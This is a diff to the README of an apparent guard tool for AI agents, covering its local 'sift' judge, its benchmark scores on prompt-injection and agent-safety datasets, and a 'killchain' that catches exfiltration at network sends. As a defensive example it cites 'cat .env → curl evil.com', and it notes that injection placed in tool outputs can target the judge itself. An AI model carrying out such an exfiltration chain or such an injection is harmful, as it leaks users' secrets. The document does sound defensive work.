@@ -296,43 +296,43 @@ non-interactive audit/batch runs.
 
 ![sift vs LLM across benchmarks](./doc/bench_sift_vs_llm.svg)
 
-### The non-LLM decider (`sift`) — zero cost, and an honest gap
+### The non-LLM decider (`sift`) — zero cost
 
-The default judge is **`sift`** (Semantic Intent & Flow Triage) — a local embedding + structural
-model (see [`sift/`](sift/)) — no LLM, no API, no network, **$0 and sub-millisecond**. The honest read:
+The default judge is **`sift`** (Semantic Intent & Flow Triage) — a local **frozen embedding + small
+sklearn head** (see [`sift/`](sift/)): no LLM, no API, no network, **$0, sub-millisecond, torch-free**.
 
-- **On injection it holds its own** — 93.5% of InjecAgent attacks stopped with 94.1% of benign clean;
-  on **AgentTrust and ToolEmu (by balanced score) it beats the LLM**, which over-blocks benign work.
-- **Content-sensitivity gate (graded, not on/off)** — a bare `curl` or a benign `send` flows; risk rises
-  by *what* is touched (`passport.png`, credentials, a wire transfer → ask) × where it goes × who chose
-  the destination, scored as a weighted sum. This is why the benign-clean numbers are high without letting
-  real exfil through (InjecAgent still 93.5% stopped).
-- **An optional session-trajectory gate raises the R-Judge ceiling, LLM-free — but ships OFF** — the same
-  local model, run over the *whole session so far* (not just one step), can ASK when the accumulated pattern
-  looks unsafe, lifting held-out R-Judge F1 to 67. But the static-embedding head barely discriminates at the
-  session level (a benign shell run and a real read→encode→send both score ≈0.96), so at any usable threshold
-  it flags over half of benign sessions — pure nagging in an interactive shell. So it **defaults off**
-  (`traj_gate=0`); the deterministic **killchain** does the real slow-exfil detection, and does it **only at
-  a network send** — the one moment data can actually leave. Every step quietly records *whether it touched
-  sensitive data*; when a `curl`/`scp`/POST to an **external** host fires, the killchain looks back over the
-  whole session at full vigour (secret read, staging, recon, encoding) and DENYs a real exfil chain / ASKs on
-  a softer one. On any non-network command it does nothing — so a run of ordinary commands (`ls`, `cat notes`,
-  `git status`, curls to trusted hosts) is never a chain, while `cat .env → curl evil.com` is stopped at the
-  curl. (A frozen small transformer, MiniLM, was tested as the encoder and did **not** beat the static model —
-  so ddbt stays torch-free.)
-- **R-Judge scores every ASK as a false positive** (it's binary — no "ask a human" bucket) — but an
-  ASK is ddbt's *feature*, not a miss, so sift's F1 here is a **lower bound**. ddbt never blocks the
-  agent from *talking to you*; only tool actions with external effect are gated.
+Latest scorecard (default `potion-32M` encoder):
 
-The LLM stays available as a flagged fallback (`DDBT_JUDGE=llm` or `ddbt.json` `"judge": "llm"`).
-Full method breakdown and charts: [`sift/README.md`](sift/README.md).
+| dataset                      | result                    | note                                                            |
+| ---------------------------- | ------------------------- | -------------------------------------------------------------- |
+| InjecAgent                   | **95% stopped / 94% clean** | prompt-injection interception                                   |
+| AgentTrust                   | **100% / 100%**           |                                                                |
+| R-Judge (held-out classify)  | **F1 0.91 / AUROC 0.92**  | the LLM-comparable metric                                       |
+| ToolEmu                      | 24% stopped / 85% clean   | ceiling: an LLM-behaviour judgment a static head can't reproduce |
+| AgentSafetyBench             | 40% / 60%                 | same ceiling                                                    |
+
+- **Content-sensitivity gate (graded, not on/off)** — a bare `curl`/`send` flows; risk rises by *what* is
+  touched (`passport.png`, credentials, a wire transfer → ask) × where it goes × who chose the destination.
+  High benign-clean without letting real exfil through.
+- **Slow exfil → deterministic `killchain`, only at a network send.** Every step records *whether it touched
+  sensitive data*; when a `curl`/`scp`/POST to an external host fires, it looks back over the whole session
+  (secret read → staging → encoding) and DENYs a real chain / ASKs a softer one. Non-network commands do
+  nothing — so `ls`, `cat notes`, `git status` are never a "chain", while `cat .env → curl evil.com` is
+  stopped at the curl. (An optional whole-session sift gate exists but ships **off** — at the session level
+  the static head barely separates benign from attack, so it just nags.)
+- **Encoder study (`bench/compare_encoders.py`)** — `potion-32M` wins (best R-Judge F1, torch-free);
+  `potion-8M` is a ~4× smaller "sift-mini". Other-lab torch encoders (Gemma/Qwen/BGE/E5/GTE/Nomic/Arctic)
+  are wired in for comparison but don't beat 32M enough to justify pulling in torch.
+- **R-Judge scores every ASK as a false positive** (binary — no "ask a human" bucket), so sift's F1 is a
+  **lower bound**: an ASK is ddbt's *feature*, not a miss.
+
+The LLM stays available as a flagged fallback (`DDBT_JUDGE=llm`). Full breakdown: [`sift/README.md`](sift/README.md).
 
 ## Honest limits
 
-- **The judge reads tool outputs** to catch stray/injected steps — more capable than a wordlist,
-  but it can be _targeted_ by injection in that content (the LGA risk). Mitigated by quarantine
-  (no-leak), hostile-under-inspection framing, structured-verdict-only, and fail-closed — reduced,
-  not eliminated. Measured adversarially, not claimed by design.
-- **One LLM call per system-touching step** (latency + cost). The ticket's fast-path skips it for
-  safe in-scope reads; the stub judge keeps CI fast and free.
-- **Utility is unmeasured** (see above) and **per-provider credential minting is unbuilt**.
+- **The judge reads tool outputs** to catch injected steps — powerful, but can be _targeted_ by injection
+  in that content (the LGA risk). Mitigated by quarantine, hostile-under-inspection framing,
+  structured-verdict-only, and fail-closed — reduced, not eliminated.
+- **ToolEmu / AgentSafetyBench are the ceiling** — their safe/unsafe line is an LLM-behaviour judgment a
+  static embedding can't fully reproduce; enable `DDBT_JUDGE=llm` where that matters.
+- **Utility is unmeasured** and **per-provider credential minting is unbuilt**.
